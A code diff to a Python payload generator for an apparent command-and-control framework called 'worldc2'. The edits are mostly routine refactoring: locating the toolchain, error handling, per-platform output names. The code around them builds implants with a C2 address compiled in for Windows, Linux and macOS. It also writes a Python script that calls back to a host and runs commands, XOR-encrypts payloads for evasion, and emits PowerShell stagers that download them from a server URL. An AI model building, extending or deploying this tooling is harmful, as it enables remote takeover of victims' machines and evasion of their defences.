@@ -21,15 +21,24 @@ OUTPUT_DIR = PROJECT_ROOT / "payloads"
 OUTPUT_DIR.mkdir(exist_ok=True)
 
 def find_go():
-    for p in ["/home/rby/go/bin/go","/usr/local/go/bin/go","/tmp/go/bin/go"]:
-        if os.path.exists(p): return p
-    return shutil.which("go")
+    """Locate the Go toolchain: PATH first, then the standard system install dir.
+
+    No personal/hardcoded user paths: anything outside the PATH and the
+    official /usr/local/go install location is intentionally not consulted.
+    """
+    go_bin = shutil.which("go")
+    if go_bin:
+        return go_bin
+    system_go = Path("/usr/local/go/bin/go")
+    if system_go.exists():
+        return str(system_go)
+    return None
 
 def build_go_docker(goos, goarch, output, server=""):
     """Build Go payload using Docker when Go is not installed locally."""
     if not shutil.which("docker"):
+        print(f"{RED}[✗]{RESET} Docker not found in PATH — cannot build without a local Go toolchain.")
         return None
-    agent_dir = PROJECT_ROOT/"src"/"go"
     print(f"{BLUE}[>]{RESET} Building via Docker {goos}/{goarch}...")
     if server:
         print(f"   {CYAN}Baked-in C2:{RESET} {server}")
@@ -37,15 +46,6 @@ def build_go_docker(goos, goarch, output, server=""):
     if server:
         ldflags += f" -X 'main.DefaultServer={server}'"
     out_name = output.name
-    cmd = [
-        "docker", "run", "--rm",
-        "-v", f"{agent_dir}:/app",
-        "-w", "/app",
-        "golang:1.26-alpine",
-        "sh", "-c",
-        f"GOOS={goos} GOARCH={goarch} CGO_ENABLED=0 go build -ldflags='{ldflags}' -o /tmp/{out_name} ./cmd/agent/main.go && cp /tmp/{out_name} /app/../../payloads/{out_name}"
-    ]
-    # Simpler approach: build in a temp container and copy out
     cmd = [
         "docker", "run", "--rm",
         "-v", f"{PROJECT_ROOT}:/src",
@@ -83,7 +83,9 @@ def get_local_ip():
     try:
         s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
         s.connect(("8.8.8.8",80));ip=s.getsockname()[0];s.close();return ip
-    except: return "127.0.0.1"
+    except OSError as e:
+        print(f"{YELLOW}[!]{RESET} IP auto-detect failed ({e}); using 127.0.0.1")
+        return "127.0.0.1"
 
 def banner():
     print(f"""{BOLD}{CYAN}
@@ -95,8 +97,12 @@ def banner():
 def build_go_payload(goos, goarch, output, server="", suffix="", obfuscate=False):
     go_bin = find_go()
     if not go_bin:
-        # Fallback to Docker
-        return build_go_docker(goos, goarch, output, server)
+        # Fallback to Docker (if available), otherwise fail with a clear message
+        if shutil.which("docker"):
+            return build_go_docker(goos, goarch, output, server)
+        print(f"{RED}[✗]{RESET} Go toolchain not found in PATH and Docker not available.")
+        print(f"{YELLOW}[!]{RESET} Install Go (https://go.dev/doc/install) or Docker to build payloads.")
+        return None
     agent_dir = PROJECT_ROOT/"src"/"go"/"cmd"/"agent"
     if not (agent_dir/"main.go").exists(): return None
     print(f"{BLUE}[>]{RESET} Cross-compiling {goos}/{goarch}...")
@@ -159,7 +165,7 @@ $c.Close()
 
 def generate_python(server, name=None):
     out = OUTPUT_DIR/(name or f"worldc2-{datetime.now():%Y%m%d_%H%M}.py")
-    host,_,port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
+    host, port = server.rsplit(":", 1) if ":" in server else (server, "8443")
     code=f'''import socket,subprocess,os,time
 H,P="{host}",{port}
 while 1:
@@ -199,11 +205,14 @@ def generate_evasive(server):
     payload=None
     for f in sorted(OUTPUT_DIR.glob("worldc2-linux-*"),key=lambda x:x.stat().st_mtime,reverse=True):
         if f.is_file() and f.suffix=="": payload=f; break
-    if payload:
-        d=bytearray(payload.read_bytes())
-        for i in range(len(d)): d[i]^=key[i%32]
-        (OUTPUT_DIR/"payload.enc").write_bytes(d)
-        print(f"{GREEN}[✓]{RESET} payload.enc ({len(d)} bytes)")
+    if payload is None:
+        print(f"{RED}[✗]{RESET} No Linux payload found in payloads/ (expected worldc2-linux-*).")
+        print(f"{YELLOW}[!]{RESET} Build it first (e.g. python3 payload.py --os linux) — stagers not generated.")
+        return
+    d=bytearray(payload.read_bytes())
+    for i in range(len(d)): d[i]^=key[i%32]
+    (OUTPUT_DIR/"payload.enc").write_bytes(d)
+    print(f"{GREEN}[✓]{RESET} payload.enc ({len(d)} bytes)")
     stagers={
         "ps1":f'''$k=[byte[]]@({','.join(str(b) for b in key)})
 $u="{server_url}"
@@ -313,13 +322,40 @@ def main():
         server = f"{server}:8443"
     print(f"{BOLD}Target:{RESET} {GREEN}{server}{RESET}\n")
 
-    if args.os in ("windows","all"): generate_exe(server,args.output)
-    if args.os in ("linux","all"): generate_elf(server,args.output)
+    # With --os all a single --output name would be overwritten by every
+    # platform build: derive per-OS suffixed names instead.
+    def out_for(os_tag):
+        """Output name for one platform: per-OS suffixed when --os all + --output,
+        the requested --output otherwise (None → generator's default name)."""
+        if args.os != "all":
+            return args.output
+        if not args.output:
+            return None  # default names already carry the platform suffix
+        stem = Path(args.output).stem
+        ext = Path(args.output).suffix
+        if os_tag == "windows":
+            return str(OUTPUT_DIR / f"{stem}-windows{ext or '.exe'}")
+        if os_tag == "linux":
+            return str(OUTPUT_DIR / f"{stem}-linux{ext}")
+        if os_tag.startswith("darwin"):
+            return str(OUTPUT_DIR / f"{stem}-{os_tag}{ext}")
+        if os_tag == "ps1":
+            return str(OUTPUT_DIR / f"{stem}-ps1.ps1")
+        if os_tag == "python":
+            return str(OUTPUT_DIR / f"{stem}-python.py")
+        return None
+
+    if args.os == "all" and args.output:
+        print(f"{YELLOW}[!]{RESET} --os all: a single --output would be overwritten "
+              f"per platform; using '{Path(args.output).stem}-<os>' names instead")
+
+    if args.os in ("windows","all"): generate_exe(server, out_for("windows"))
+    if args.os in ("linux","all"): generate_elf(server, out_for("linux"))
     if args.os in ("darwin","all"):
-        generate_macho(server,"amd64",args.output)
-        generate_macho(server,"arm64",args.output)
-    if args.os in ("ps1","all"): generate_ps1(server,args.output)
-    if args.os in ("python","all"): generate_python(server,args.output)
+        generate_macho(server,"amd64",out_for("darwin-amd64"))
+        generate_macho(server,"arm64",out_for("darwin-arm64"))
+    if args.os in ("ps1","all"): generate_ps1(server, out_for("ps1"))
+    if args.os in ("python","all"): generate_python(server, out_for("python"))
     if args.os == "c": generate_c(server,args.output)
     if args.evasive: generate_evasive(server)
 
